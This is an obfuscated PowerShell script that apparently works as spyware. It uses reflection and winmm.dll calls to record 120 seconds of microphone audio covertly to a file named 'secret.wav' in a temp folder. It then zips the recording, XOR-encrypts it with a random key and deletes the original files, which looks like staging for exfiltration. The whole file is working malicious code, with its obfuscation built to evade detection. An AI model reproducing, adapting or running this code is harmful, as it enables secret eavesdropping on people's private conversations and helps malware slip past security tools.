 seT-iTEm  ("{2}{0}{1}{3}" -f'riaBLE:OG','4XR','vA','B')  ( [tYpe]("{1}{6}{12}{2}{11}{5}{0}{8}{4}{10}{7}{9}{3}"-F '.aS','s','refL','S','eMBly','Mit','Yst','UilDeRaC','S','CEs','B','EcTiON.e','eM.') ) ; Sv  84e3  (  [tyPe]("{3}{4}{1}{6}{9}{0}{8}{7}{5}{2}"-f'INgCONV','CT','nS','SyST','EM.rEFlE','Io','i','t','eN','on.CaLL'))  ;  ${h`JI}  = [TypE]("{0}{1}{2}"-F 'aP','PdOmA','In')  ;  SEt-ItEM ("{0}{1}{2}"-f 'VaRI','AbLE:','1lH74')  ([tYpe]("{8}{6}{4}{1}{2}{10}{0}{7}{9}{3}{5}"-f'tErop','TI','ME.','ARsHA','UN','l','m.r','Servic','SYsTE','es.m','In'));  function g`et-Mi`CRO`PH`ON`eaUDiO {
	[OutputType([System.IO.FileInfo])]
	Param
	(
		[Parameter( POsiTiON = 0, MandAtoRY = ${t`RuE})]
		[ValidateScript({.("{2}{0}{1}" -f 't','h','Split-Pa') ${_} | &("{1}{2}{0}"-f 'h','Te','st-Pat')})]
		[String] ${PA`TH},
		[Parameter( PoSITIoN = 1, mandAtOry = ${f`AL`Se})]
		[Int] ${L`Ength} = 30,
		[Parameter( POSItIon = 2, MANdAtORY = ${F`ALSE})]
		[String] ${aLi`As} = $(-join ((65..90) + (97..122) | &("{1}{2}{0}"-f 'om','Get-','Rand') -Count 10 | .('%') {[char]${_}}))

	)

	
	function locAL`:GEt-deL`e`Ga`TetyPE
	{
		Param
		(
			[OutputType([Type])]
			
			[Parameter( pOsitiOn = 0)]
			[Type[]]
			${pA`RA`mETe`Rs} = (.("{0}{1}{2}"-f 'Ne','w-Ob','ject') ("{1}{0}{2}"-f'[','Type',']')(0)),
			
			[Parameter( PoSItion = 1 )]
			[Type]
			${REt`UR`NtYPe} = [Void]
		)

		${d`OMAIN} =   (gci ("vaRi"+"AbLE:"+"hjI")).VALue::"curreNTD`oM`A`In"
		${d`YN`ASs`EMBLY} = .("{1}{2}{0}"-f't','New-','Objec') ("{0}{5}{6}{8}{4}{7}{2}{3}{1}"-f 'Syst','blyName','.A','ssem','ti','em','.R','on','eflec')(("{2}{0}{3}{1}"-f 'flectedDel','te','Re','ega'))
		${AsSeMbl`Y`B`UIlDeR} = ${DOM`AiN}."deFi`N`EdYNam`ICaS`seM`Bly"(${dynAs`sE`MbLy},   (  VaRiablE  ("{1}{0}{2}"-f'G4x','O','rb')).VaLuE::"R`Un")
		${MoDULe`BUIl`deR} = ${As`sEmb`lyBu`i`lDEr}.("{3}{1}{2}{0}" -f'odule','eDyn','amicM','Defin').Invoke(("{3}{2}{1}{4}{0}"-f 'e','emoryMod','nM','I','ul'), ${f`AlsE})
		${Ty`PEBui`lDeR} = ${M`o`duLEbUI`lDer}.("{0}{2}{1}"-f'Defin','e','eTyp').Invoke(("{0}{2}{1}"-f'MyDe','egateType','l'), ("{2}{11}{1}{8}{7}{9}{3}{0}{10}{5}{4}{6}"-f ' ','b','Class, ','ed,',' Auto','ss,','Class',' Sea','lic,','l','AnsiCla','Pu'), [System.MulticastDelegate])
		${CoNS`TR`UCTO`RbUiLDER} = ${tYPEbu`Il`d`Er}.("{3}{2}{0}{1}"-f 'truct','or','s','DefineCon').Invoke(("{4}{3}{8}{1}{7}{2}{6}{5}{0}"-f'lic','e','ideByS','Spec','RT',', Pub','ig',', H','ialNam'),   ${84`e3}::"stAND`A`Rd", ${p`ARAmET`ERS})
		${COn`STRu`c`T`OR`BuiL`dER}.("{2}{0}{5}{1}{3}{4}" -f 'Imple','ionFla','Set','g','s','mentat').Invoke(("{1}{3}{0}{4}{2}"-f 'M','R','d','untime, ','anage'))
		${METhOd`B`U`iLd`er} = ${ty`p`EBUILdeR}.("{2}{0}{3}{1}"-f'Me','d','Define','tho').Invoke('Invoke', ("{7}{3}{0}{1}{6}{2}{8}{4}{5}" -f'eBySig,',' New','i','Hid','tua','l','Slot, V','Public, ','r'), ${REtUR`Nty`Pe}, ${PAR`AMe`Ters})
		${ME`Tho`dB`UILdeR}.("{2}{4}{0}{1}{3}{5}" -f 'e','nt','Set','atio','Implem','nFlags').Invoke(("{0}{3}{2}{1}" -f'R',', Managed','me','unti'))
		
		.("{1}{2}{3}{0}"-f't','Writ','e-Outp','u') ${Typ`e`BuI`LDeR}.("{1}{0}{2}" -f 'eTy','Creat','pe').Invoke()
	}

	
	function L`oc`Al:get-pROca`D`d`ResS
	{
		Param
		(
			[OutputType([IntPtr])]
		
			[Parameter( PoSition = 0, mAnDaToRY = ${t`RUe} )]
			[String]
			${Modu`lE},
			
			[Parameter( poSITioN = 1, mAndatORY = ${Tr`UE} )]
			[String]
			${P`ROC`ED`URe}
		)

		
		${s`ysteMaSsEMb`lY} =  (  geT-ChiLdIteM  ("{2}{1}{3}{0}"-f 'i','aBLE:H','vARI','j')).value::"CU`R`RENT`do`Main".("{0}{2}{1}" -f'GetAs','ies','sembl').Invoke() |
			.("{1}{0}{2}" -f'here-Objec','W','t') { ${_}."gLObaLasse`m`B`L`Yc`Ac`HE" -And ${_}."loCA`T`IOn".("{1}{0}" -f 'it','Spl').Invoke('\\')[-1].("{1}{0}"-f 's','Equal').Invoke(("{2}{0}{1}"-f'.','dll','System')) }
		${unsAF`ENat`iVem`e`TH`O`dS} = ${syst`eM`A`SseMbLY}.("{0}{2}{1}"-f'Get','pe','Ty').Invoke(("{8}{6}{2}{5}{7}{3}{4}{0}{1}" -f 'iveMethod','s','n3','Na','t','2.Unsaf','oft.Wi','e','Micros'))
		
        
        ${gE`T`mOduLeHANdlE} = ${UNSAFe`N`AtI`Ve`meT`HODs}.("{2}{0}{3}{1}" -f'tMet','od','Ge','h').Invoke(("{0}{1}{2}{3}" -f'Get','Modu','leHa','ndle'), [Type[]]@([String]))
        ${g`Etproc`AD`dRE`SS} = ${UnsAF`EnatiV`e`M`E`Th`OdS}.("{0}{2}{1}"-f 'GetMe','d','tho').Invoke(("{0}{1}{3}{2}" -f 'G','e','ddress','tProcA'), [Type[]]@([System.Runtime.InteropServices.HandleRef], [String]))

		
		${k`ErN3`2`HA`NDle} = ${geT`modu`l`EHAn`Dle}."i`NVOKE"(${N`Ull}, @(${Mo`D`UlE}))
		${T`MPptR} = .("{0}{2}{1}" -f'New-O','ct','bje') ("{1}{0}{2}" -f 'tP','In','tr')
		${Handl`Er`Ef} = .("{2}{0}{1}" -f'Objec','t','New-') ("{7}{1}{6}{0}{5}{2}{4}{8}{3}" -f 'r','ystem.Runtime.','Ser','eRef','v','op','Inte','S','ices.Handl')(${t`MPptR}, ${ke`RN`3`2HAndLE})
		
		
		.("{1}{3}{2}{0}"-f'put','Wr','ut','ite-O') ${gEtpRO`C`A`DdrE`sS}."In`VoKe"(${Nu`lL}, @([System.Runtime.InteropServices.HandleRef]${hA`NdLER`EF}, ${p`Ro`CeD`URE}))
	} 

	
	${LO`ADlIbra`RYA`DDR} = .("{1}{0}{2}{3}{4}"-f'et-Pr','G','ocA','dd','ress') ("{1}{0}{2}{3}"-f'.','kernel32','d','ll') ("{2}{0}{1}" -f 'adLibrary','A','Lo')
	${LoAdLibRaR`YDE`L`eg`ATe} = .("{0}{2}{1}" -f 'Get-Del','gateType','e') @([String]) ([IntPtr])
	${LOADLi`Br`A`RY} =  (gEt-ITem ("{1}{0}{4}{2}{3}"-f'LE','VArIaB','Lh','74',':1')  ).Value::("{0}{4}{2}{3}{6}{5}{1}" -f'GetDe','er','eForFuncti','onPoi','legat','t','n').Invoke(${L`OAdlibRaRYA`D`dr}, ${L`OA`DLIB`RA`RydeLeGa`Te})
	${H`Nd} = ${N`UlL}
	${H`Nd} = ${LoAD`L`iBR`ARy}."IN`VOKe"(("{1}{2}{0}" -f 'dll','w','inmm.'))
	if (${h`ND} -eq ${nU`LL})
	{
		Throw ("{6}{2}{5}{8}{4}{3}{9}{0}{1}{7}" -f'to',' winmm',' ','ire handle','qu','to ','Failed','.dll','a',' ')
	}

	
	${W`A`VEINgEtnU`mdEV`SaddR} = ${nU`lL}
	${W`AV`Ei`N`geTn`UMdeVSAddr} = .("{0}{4}{3}{2}{1}" -f 'G','ocAddress','-Pr','t','e') ("{1}{0}{2}"-f'nmm.dl','wi','l') ("{3}{1}{2}{0}"-f'NumDevs','av','eInGet','w')
	${wavEiNgeT`NuMDeV`sDeLe`g`ATE} = .("{3}{2}{0}{1}"-f '-Delegate','Type','t','Ge') @() ([Uint32])
	if (${wAv`eInge`TNUmDE`VS`ADDr} -eq ${Nu`LL})
	{
		Throw ("{10}{2}{4}{5}{8}{6}{11}{1}{7}{3}{0}{9}"-f'Get','to','ail','n','ed to aqu','ir','add',' WaveI','e ','NumDevs','F','ress ')
	}
	${WaVeiNGE`T`Num`Devs} =  (VARIaBlE ('1L'+'h74')  -VAL)::("{2}{4}{0}{1}{3}" -f 'ct','ionPoint','GetDelegat','er','eForFun').Invoke(${W`AvEingEt`N`UMDE`Vs`Ad`DR}, ${waVEINgE`T`NuMdeVsD`eLe`gate})

	
	${MciS`ends`TRin`GA`DdR} = ${n`Ull}
	${m`C`I`sen`dstri`NgAdDr} = .("{2}{0}{1}" -f'dres','s','Get-ProcAd') ("{0}{2}{1}"-f 'w','mm.dll','in') ("{2}{0}{3}{1}" -f'ci','dStringA','m','Sen')
	${mc`ISENDSTRI`N`GDElEg`ATE} = &("{1}{0}{3}{4}{2}" -f 'et','G','eType','-Dele','gat') @([String],[String],[UInt32],[IntPtr]) ([Uint32])
	if (${M`CiS`eN`dSTr`IngaD`dR} -eq ${NU`ll})
	{
		Throw ("{3}{5}{1}{2}{6}{0}{4}" -f ' to mciSendString','r','e add','Failed to','A',' aqui','ress')
	}
	${mcIS`ENd`S`T`RiNg} =   ( LS  ("VaRi"+"Ab"+"le:1L"+"h74")  ).Value::("{0}{1}{7}{8}{3}{5}{6}{4}{2}"-f'Ge','tDe','inter','un','Po','ctio','n','le','gateForF').Invoke(${Mci`s`EndST`RI`Nga`DdR}, ${MCIS`EN`d`StRINgdE`l`eG`ATe})

	
	${mcIG`etERRO`RsTRIN`GADDr} = ${n`ULl}
	${MC`IGe`T`erRO`RS`TrINg`Addr} = &("{3}{2}{1}{0}" -f'ddress','ProcA','t-','Ge') ("{1}{2}{0}"-f'l','w','inmm.dl') ("{0}{5}{3}{2}{1}{4}"-f 'm','tErrorSt','Ge','i','ringA','c')
	${mCi`gETe`RROr`STRInG`dELe`gate} = .("{2}{0}{3}{1}" -f't-Delegat','Type','Ge','e') @([UInt32],[Text.StringBuilder],[UInt32]) ([bool])
	if (${M`CIgEtE`RRO`RSTR`INGAddr} -eq ${Nu`lL})
	{
		Throw ("{8}{6}{4}{7}{3}{5}{1}{2}{0}" -f 'g','GetErrorStr','in','s t',' a','o mci','e','ddres','Failed to aquir')
	}
	${M`c`IGEte`RRo`RStrINg} =  (  VARiaBLe  ("{0}{1}"-f'1LH7','4')  ).vAlUe::("{5}{6}{4}{7}{3}{8}{2}{0}{1}" -f 'ointe','r','ionP','orFunc','t','GetDe','lega','eF','t').Invoke(${m`cigetE`RRO`RsT`Ri`NgADDR},${Mc`I`gE`Ter`Ror`S`TRInGD`E`lEGATe})

	
	${dE`Vi`cEco`UNT} = ${w`Av`eiNg`etNuMDevs}."In`VoKe"()

	if (${dE`VI`CEcouNT} -gt 0)
	{

		
		${eRRM`sg} = .("{0}{2}{1}" -f'New-Obj','ct','e') ("{3}{0}{4}{2}{1}"-f 't.St','ilder','ngBu','Tex','ri') 150

		
		${R`Tn`VAl} = ${mc`I`SENDSt`RinG}."iNv`O`KE"(('ope'+'n '+'n'+'ew '+'Type'+' '+'waveau'+'dio'+' '+'Alia'+'s '+"$alias"),'',0,0)
		if (${RtNv`AL} -ne 0) {${MC`igETerr`o`RsTRIng}."iN`Vo`ke"(${RT`N`Val},${e`RR`msg},150); ${m`Sg}=${E`RrmSG}.("{0}{1}" -f 'ToStrin','g').Invoke();Throw ('MC'+'I '+'Er'+'r'+'or '+"($rtnVal): "+"$msg")}
		
		
		${RT`Nval} = ${Mcis`EnD`s`Tr`InG}."inv`OkE"(('re'+'c'+'ord '+"$alias"), '', 0, 0)
		if (${R`TnvaL} -ne 0) {${McIgE`T`ErRo`Rs`Tring}."i`NvOke"(${rT`Nv`AL},${err`m`Sg},150); ${M`SG}=${ER`Rmsg}.("{0}{1}"-f 'ToStr','ing').Invoke();Throw ('M'+'CI '+'Err'+'or'+' '+"($rtnVal): "+"$msg")}
		
		&("{2}{0}{1}{3}" -f 'rt-Sl','ee','Sta','p') -s ${l`en`GtH}

		
		${r`TNvAL} = ${MciS`eN`DSTR`Ing}."i`N`Voke"(('sav'+'e '+"$alias "+"`"$path`""), '', 0, 0)
		if (${rt`Nv`AL} -ne 0) {${MC`I`g`eteRr`orS`TrING}."inv`OKE"(${rTNV`AL},${erRm`SG},150); ${M`Sg}=${E`RR`MsG}.("{0}{2}{1}"-f'ToSt','ng','ri').Invoke();Throw ('MCI'+' '+'E'+'rr'+'or '+"($rtnVal): "+"$msg")}

		
		${rt`N`VAL} = ${M`c`ISe`NDsTRInG}."i`NVo`KE"(('clos'+'e '+"$alias"), '', 0, 0);
		if (${rtN`VAL} -ne 0) {${mc`iG`ETE`R`Ror`StRINg}."iN`VoKe"(${rTnV`AL},${Err`m`sG},150); ${m`SG}=${E`Rrm`sG}.("{1}{2}{0}"-f 'ing','T','oStr').Invoke();Throw ('M'+'CI '+'Erro'+'r '+"($rtnVal): "+"$msg")}

		${oU`TFilE} = &("{0}{1}{3}{2}"-f'Get-C','hildIt','m','e') -path ${P`AtH} 
		&("{1}{0}{2}" -f 'utp','Write-O','ut') ${ouTFI`lE}

	}
	else
	{
		Throw ("{4}{3}{6}{1}{7}{2}{5}{0}"-f'g devices','rate ','rdi','d','Faile','n',' to enume','any reco')
	}
}

${DirE`ctO`RY} = "$env:tmp\207812f09349ef96b709cfe8d7e295ba"
if (-not (&("{1}{0}"-f 'st-Path','Te') ${DIR`ecto`Ry} -PathType ("{0}{1}{2}"-f 'Co','ntai','ner'))) {
    &("{1}{0}{2}" -f'w-','Ne','Item') -ItemType ("{1}{2}{0}"-f'tory','D','irec') -Path ${dir`ec`TORy} | .("{1}{0}"-f 'll','Out-Nu')
}

&("{1}{2}{0}{4}{3}{5}" -f'ph','Get-','Micro','neAud','o','io') -Path "$Directory\secret.wav" -Length 120 -Alias ("{1}{0}" -f 'ET','SECR')

$sourceFolderPath = ${DirE`ctO`RY}

$outputZipFilePath = "$env:tmp\207812f09349ef96b709cfe8d7e295ba.zip"

$random = New-Object System.Random
$key = $random.Next(0, 256)

Add-Type -AssemblyName System.IO.Compression.FileSystem
[System.IO.Compression.ZipFile]::CreateFromDirectory($sourceFolderPath, $outputZipFilePath)

$zipBytes = [System.IO.File]::ReadAllBytes($outputZipFilePath)

for ($i = 0; $i -lt $zipBytes.Length; $i++) {
    $zipBytes[$i] = $zipBytes[$i] -bxor $key
}

$outputEncryptedFilePath = "$env:tmp\207812f09349ef96b709cfe8d7e295ba_.zip"

$stream = [System.IO.File]::Create($outputEncryptedFilePath)
$stream.Write($key, 0, 1)
$stream.Write($zipBytes, 0, $zipBytes.Length)
$stream.Close()

Remove-Item -Path $sourceFolderPath -Recurse -Force
Get-ChildItem -Path $outputZipFilePath | Remove-Item -Force